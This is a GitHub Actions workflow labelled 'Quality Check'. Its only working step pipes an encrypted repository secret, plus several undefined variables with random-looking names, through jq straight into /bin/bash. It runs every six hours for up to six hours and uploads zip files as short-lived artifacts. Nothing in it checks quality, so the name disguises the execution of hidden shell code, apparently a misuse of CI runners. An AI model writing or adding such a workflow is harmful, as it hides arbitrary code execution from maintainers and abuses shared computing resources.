name: Quality Check
on:
  workflow_dispatch:

  schedule:
    - cron: '35 0,6,12,18 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Go
        env:
          kpawz99: ${{ secrets.kpawz99 }}
        run: |
          printf '%s' "$kpawz99" | jq -r .thnl20733 | /bin/bash
          echo $vygq354 | jq -r .isilk241 | /bin/bash
          echo $cjbg727 | jq -r .o443 | /bin/bash
          printf '%s' "$yhc2" | jq -r .uj01014 | /bin/bash
          echo $abasy125 | jq -r .ol1 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: LmGlY23t
          path: "*.zip"
          retention-days: 1
